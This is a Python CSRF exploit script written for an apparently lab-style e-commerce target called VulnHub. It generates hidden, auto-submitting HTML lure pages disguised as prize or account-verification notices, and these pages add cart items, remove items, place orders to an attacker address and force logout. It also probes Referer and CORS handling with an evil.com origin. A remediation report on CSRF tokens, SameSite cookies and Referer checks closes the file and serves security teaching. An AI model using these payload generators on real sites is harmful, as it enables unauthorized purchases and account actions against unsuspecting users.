#!/usr/bin/env python3
"""
Cross-Site Request Forgery (CSRF) Exploit for VulnHub E-commerce
Author: Chris Cortes
Target: Shopping cart operations
Impact: Unauthorized actions on behalf of authenticated users

This script demonstrates CSRF vulnerabilities in state-changing operations.
The application does not validate request origin or use anti-CSRF tokens.

OWASP Top 10 2021: A01 - Broken Access Control
CWE-352: Cross-Site Request Forgery
"""

import requests
import sys
from urllib.parse import urljoin
import time

class CSRFExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        
    def banner(self):
        """Display exploit banner"""
        print("=" * 60)
        print("CSRF Exploit - VulnHub E-commerce")
        print("Target: Shopping Cart Operations")
        print("=" * 60)
        print()
    
    def test_csrf_vulnerability(self):
        """Test if CSRF protection exists"""
        print("[*] Testing for CSRF protection...")
        print()
        
        # Check if requests include CSRF tokens
        session = requests.Session()
        login_url = urljoin(self.base_url, '/login')
        
        try:
            response = session.get(login_url)
            
            # Check for CSRF token in form
            if 'csrf_token' in response.text or '_csrf' in response.text:
                print("[+] CSRF token found in forms")
                print("[*] Testing if token is validated...")
                return False
            else:
                print("[!] No CSRF tokens found in forms")
                print("[+] Application is vulnerable to CSRF!")
                return True
                
        except Exception as e:
            print(f"[-] Error testing CSRF: {e}")
            return False
    
    def generate_csrf_add_to_cart(self, product_id=1, quantity=100):
        """Generate malicious HTML page for CSRF attack - Add to Cart"""
        print(f"\n[*] Generating CSRF exploit: Add to Cart")
        print(f"    Target: Product ID {product_id}, Quantity {quantity}")
        print()
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Free Prize - Click Here!</title>
</head>
<body>
    <h1>Congratulations! You've won a prize!</h1>
    <p>Click the button below to claim your reward...</p>
    
    <!-- Hidden CSRF form - Auto-submits on page load -->
    <form id="csrf-form" action="{self.base_url}/cart/add/{product_id}" method="POST" style="display:none;">
        <input type="text" name="quantity" value="{quantity}">
        <input type="submit" value="Submit">
    </form>
    
    <button onclick="document.getElementById('csrf-form').submit();">Claim Prize</button>
    
    <!-- Auto-submit after 2 seconds -->
    <script>
        setTimeout(function() {{
            document.getElementById('csrf-form').submit();
        }}, 2000);
    </script>
</body>
</html>
"""
        
        # Save to file
        filename = f"csrf_add_cart_product_{product_id}.html"
        with open(filename, 'w') as f:
            f.write(html)
        
        print(f"[+] CSRF exploit saved to: {filename}")
        print(f"[*] Attack flow:")
        print(f"    1. Attacker hosts this page on evil.com")
        print(f"    2. Victim (logged into VulnHub) visits evil.com")
        print(f"    3. Page auto-submits form to VulnHub")
        print(f"    4. {quantity} items added to victim's cart")
        print()
        
        return filename
    
    def generate_csrf_remove_from_cart(self, item_id=1):
        """Generate malicious HTML page for CSRF attack - Remove from Cart"""
        print(f"\n[*] Generating CSRF exploit: Remove from Cart")
        print(f"    Target: Cart Item ID {item_id}")
        print()
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Check out this funny video!</title>
</head>
<body>
    <h1>Loading video...</h1>
    <img src="loading.gif" alt="Loading...">
    
    <!-- Hidden CSRF form -->
    <form id="csrf-form" action="{self.base_url}/cart/remove/{item_id}" method="POST" style="display:none;">
    </form>
    
    <!-- Auto-submit immediately -->
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
"""
        
        filename = f"csrf_remove_cart_{item_id}.html"
        with open(filename, 'w') as f:
            f.write(html)
        
        print(f"[+] CSRF exploit saved to: {filename}")
        print(f"[*] This removes item {item_id} from victim's cart")
        print()
        
        return filename
    
    def generate_csrf_place_order(self, address="123 Hacker St, Exploit City"):
        """Generate malicious HTML page for CSRF attack - Place Order"""
        print(f"\n[*] Generating CSRF exploit: Place Order")
        print(f"    Shipping to: {address}")
        print()
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Confirm Your Account</title>
</head>
<body>
    <h1>Account Verification Required</h1>
    <p>Please click below to verify your account...</p>
    
    <!-- Hidden CSRF form for checkout -->
    <form id="csrf-form" action="{self.base_url}/checkout" method="POST" style="display:none;">
        <input type="text" name="address" value="{address}">
    </form>
    
    <button onclick="document.getElementById('csrf-form').submit();">Verify Account</button>
    
    <script>
        // Auto-submit after 3 seconds
        setTimeout(function() {{
            document.getElementById('csrf-form').submit();
        }}, 3000);
    </script>
</body>
</html>
"""
        
        filename = "csrf_checkout.html"
        with open(filename, 'w') as f:
            f.write(html)
        
        print(f"[+] CSRF exploit saved to: {filename}")
        print(f"[!] CRITICAL: This can force victim to place unwanted orders!")
        print()
        
        return filename
    
    def generate_csrf_logout(self):
        """Generate malicious HTML for logout CSRF"""
        print(f"\n[*] Generating CSRF exploit: Force Logout")
        print()
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>News Article</title>
</head>
<body>
    <h1>Breaking News</h1>
    <p>Read the latest updates...</p>
    
    <!-- Hidden image tag triggers GET request -->
    <img src="{self.base_url}/logout" style="display:none;">
    
    <p>You have been logged out as a security measure.</p>
</body>
</html>
"""
        
        filename = "csrf_logout.html"
        with open(filename, 'w') as f:
            f.write(html)
        
        print(f"[+] CSRF exploit saved to: {filename}")
        print(f"[*] Forces victim logout via GET request")
        print()
        
        return filename
    
    def demonstrate_csrf_impact(self):
        """Demonstrate the impact of CSRF vulnerabilities"""
        print("\n[*] CSRF Attack Impact Analysis")
        print("=" * 60)
        print()
        
        print("Possible Attacks:")
        print()
        print("  1. Shopping Cart Manipulation")
        print("     - Add expensive items to victim's cart")
        print("     - Remove legitimate items")
        print("     - Force checkout with attacker's address")
        print()
        print("  2. Account Takeover Chain")
        print("     - Change email address")
        print("     - Request password reset")
        print("     - Add attacker as admin (if endpoint exists)")
        print()
        print("  3. Financial Impact")
        print("     - Force unwanted purchases")
        print("     - Drain wallet/credits")
        print("     - Subscribe to premium services")
        print()
        print("  4. Reputation Damage")
        print("     - Post malicious reviews")
        print("     - Send spam to contacts")
        print("     - Deface user content")
        print()
    
    def test_referer_validation(self):
        """Test if Referer header is validated"""
        print("\n[*] Testing Referer Header Validation")
        print("=" * 60)
        print()
        
        print("[*] Many applications check Referer header for CSRF protection")
        print("[*] Testing if VulnHub validates Referer...")
        print()
        
        session = requests.Session()
        
        # Login first
        login_url = urljoin(self.base_url, '/login')
        session.post(login_url, data={'username': 'user', 'password': 'password'})
        
        # Try request with external Referer
        cart_url = urljoin(self.base_url, '/cart/add/1')
        
        headers = {
            'Referer': 'http://evil.com/attack.html'
        }
        
        try:
            response = session.post(cart_url, data={'quantity': 1}, headers=headers)
            
            if response.status_code == 200 or response.status_code == 302:
                print("[!] Request accepted with external Referer!")
                print("[!] No Referer validation present")
            else:
                print("[+] Request blocked - Referer validation may be present")
                
        except Exception as e:
            print(f"[-] Error testing Referer: {e}")
        
        print()
    
    def test_cors_configuration(self):
        """Test CORS configuration"""
        print("\n[*] Testing CORS Configuration")
        print("=" * 60)
        print()
        
        print("[*] Checking if cross-origin requests are allowed...")
        
        try:
            response = requests.options(self.base_url)
            
            if 'Access-Control-Allow-Origin' in response.headers:
                origin = response.headers['Access-Control-Allow-Origin']
                print(f"[!] CORS enabled: {origin}")
                
                if origin == '*':
                    print("[!] CRITICAL: Allows requests from any origin!")
            else:
                print("[+] CORS not explicitly enabled")
                
        except Exception as e:
            print(f"[-] Error testing CORS: {e}")
        
        print()
    
    def generate_csrf_report(self):
        """Generate CSRF security report"""
        print("\n" + "=" * 60)
        print("CSRF Vulnerability Assessment Report")
        print("=" * 60)
        print()
        print("Vulnerability Details:")
        print("  Type: Cross-Site Request Forgery")
        print("  Severity: HIGH")
        print("  CWE: CWE-352")
        print("  CVSS Score: 8.1")
        print()
        print("Vulnerable Endpoints:")
        print("  ✓ /cart/add/<product_id>")
        print("  ✓ /cart/remove/<item_id>")
        print("  ✓ /checkout")
        print("  ✓ /product/<id>/review")
        print("  ✓ /logout")
        print()
        print("Root Cause:")
        print("  - No CSRF tokens in forms")
        print("  - No Referer header validation")
        print("  - No SameSite cookie attribute")
        print("  - State-changing operations via GET")
        print()
        print("Remediation:")
        print()
        print("  1. Implement CSRF Tokens (Synchronizer Token Pattern)")
        print()
        print("     # Flask-WTF example:")
        print("     from flask_wtf.csrf import CSRFProtect")
        print()
        print("     csrf = CSRFProtect(app)")
        print()
        print("     # In template:")
        print("     <form method=\"POST\">")
        print("         {{ csrf_token() }}")
        print("         ...")
        print("     </form>")
        print()
        print("  2. Set SameSite Cookie Attribute")
        print()
        print("     app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'")
        print("     # or 'Strict' for stronger protection")
        print()
        print("  3. Validate Referer Header (Defense in Depth)")
        print()
        print("     @app.before_request")
        print("     def check_referer():")
        print("         if request.method == 'POST':")
        print("             referer = request.headers.get('Referer')")
        print("             if not referer or base_url not in referer:")
        print("                 abort(403)")
        print()
        print("  4. Use POST for State Changes")
        print()
        print("     # ❌ @app.route('/logout')")
        print("     # ✅ @app.route('/logout', methods=['POST'])")
        print()
        print("  5. Implement Custom Request Headers")
        print()
        print("     # For AJAX requests, require custom header:")
        print("     X-Requested-With: XMLHttpRequest")
        print()
        print("  6. Double Submit Cookie Pattern (Alternative)")
        print()
        print("     - Set random token in cookie")
        print("     - Require same token in request parameter")
        print("     - Attacker cannot read cross-origin cookies")
        print()
        print("Testing with BurpSuite:")
        print("  1. Intercept legitimate request")
        print("  2. Remove CSRF token")
        print("  3. Change Referer to external domain")
        print("  4. Replay request - should be blocked")
        print("=" * 60)
    
    def run(self):
        """Execute the complete exploitation chain"""
        self.banner()
        
        # Test for CSRF protection
        vulnerable = self.test_csrf_vulnerability()
        
        if vulnerable:
            # Generate exploit pages
            self.generate_csrf_add_to_cart(product_id=1, quantity=100)
            self.generate_csrf_remove_from_cart(item_id=1)
            self.generate_csrf_place_order()
            self.generate_csrf_logout()
            
            # Additional tests
            self.test_referer_validation()
            self.test_cors_configuration()
            
            # Demonstrate impact
            self.demonstrate_csrf_impact()
        
        # Generate report
        self.generate_csrf_report()
        
        print("\n[+] CSRF assessment complete!")
        print(f"[+] Generated exploit files can be hosted and used for testing")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
    
    base_url = sys.argv[1]
    
    # Create and run exploit
    exploit = CSRFExploit(base_url)
    exploit.run()


if __name__ == "__main__":
    main()